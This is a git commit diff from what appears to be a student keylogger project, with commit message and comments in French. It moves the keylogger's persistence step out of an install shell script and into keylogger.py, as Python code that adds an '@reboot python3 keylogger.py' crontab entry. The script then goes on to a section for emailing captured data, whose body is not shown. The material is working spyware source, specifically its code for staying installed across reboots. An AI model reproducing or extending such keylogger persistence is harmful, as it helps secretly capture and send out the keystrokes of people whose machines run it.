9e5fd518b6986ff10e667efaed9dd99dfc58b61b
Daoudi Oussama <oussama.daoudi@etu.umontpellier.fr>
2024-10-07 14:24:09 +0200

    essaie pour mettre dans les tâches programmées depuis python

--- install_and_run/install_and_run.sh
+++ install_and_run/install_and_run.sh
@@ -26,19 +26,6 @@ else
 fi
 
 
-# Variables
-PYTHON_SCRIPT_PATH="keylogger.py"
-
-# Chemin vers l'interpréteur Python
-PYTHON_EXEC=$(which python3)
-
-# Ajouter la tâche @reboot à la crontab de l'utilisateur courant
-echo "Ajout de la tâche cron pour lancer le script Python au démarrage..."
-
-# Vérification pour éviter les doublons
-(crontab -l 2>/dev/null | grep -q "$PYTHON_SCRIPT") || (crontab -l 2>/dev/null; echo "@reboot python3 $PYTHON_SCRIPT") | crontab -
-echo "La tâche cron a été ajoutée pour exécuter le script Python au démarrage."
-
 
 
 # Exécution du fichier Python
--- scriptKeylogger/keylogger.py
+++ scriptKeylogger/keylogger.py
@@ -7,6 +7,32 @@ from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
 from email import encoders
 
+
+#--------DÉBUT TÂCHES PROGRAMMÉES---------------
+
+import os
+import subprocess
+
+# Chemin vers le script Python
+python_script = "keylogger.py"
+
+# Commande crontab pour exécuter le script Python au démarrage
+cron_job = f"@reboot python3 {python_script}"
+
+# Obtenir la crontab actuelle de l'utilisateur
+current_cron = subprocess.run(['crontab', '-l'], capture_output=True, text=True)
+
+# Vérifier si le script est déjà dans la crontab
+if cron_job not in current_cron.stdout:
+    # Ajouter la nouvelle tâche à crontab
+    new_cron = current_cron.stdout + cron_job + "\n"
+    subprocess.run(['crontab', '-'], input=new_cron, text=True)
+    print("Le script Python a été ajouté à crontab pour être exécuté au démarrage.")
+else:
+    print("Le script Python est déjà dans crontab.")
+
+#--------FIN TÂCHES PROGRAMMÉES----------------
+
 #--------DÉBUT PARTIE ENVOI MAIL----------------
 
 def sendMail():
